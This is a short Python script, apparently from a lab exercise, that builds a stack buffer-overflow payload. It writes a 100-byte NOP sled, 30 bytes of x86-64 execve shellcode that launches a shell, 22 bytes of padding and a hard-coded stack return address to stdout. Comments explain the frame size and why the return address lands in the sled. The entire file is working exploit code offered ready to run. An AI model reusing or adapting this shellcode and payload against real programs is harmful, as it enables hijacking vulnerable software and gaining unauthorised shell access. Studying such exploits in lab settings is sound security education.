import os
import sys

#os.system("nasm -felf64 shell.asm -o shell.o")
#os.system("ld shell.o -o shell")
#os.system("objdump -d shell")
#os.system("./bin2str.sh")
#os.system("./showstack")


# NOPS -> \x90
# shellcode -> \x48\x31\xd2\x48\xbb\x2f\x2f\x6f\x70\x74\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05 (30 bytes)

# stack_addr -> 0x7fffffffe198 (we must substract at least the length of our shellcode plus a few extra bytes for good measure, plus the extra padding (22 bytes). 
# This way we should land somewhere in the middle of the NOP sled, and the shellcode will be executed as expected)

# This shell code is 30 bytes in length, and will fit neatly somwwhere within the 152 bytes (128 + 16 (i j) + 8 (rbp)) we have to work with on this occasion.

sys.stdout.buffer.write(b"\x90"*100 + 
                        b"\x48\x31\xd2\x48\xbb\x2f\x2f\x6f\x70\x74\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 
                        b"\x90"*22 +
                        b"\x00\x00\x7f\xff\xff\xff\xe1\x58"[::-1])
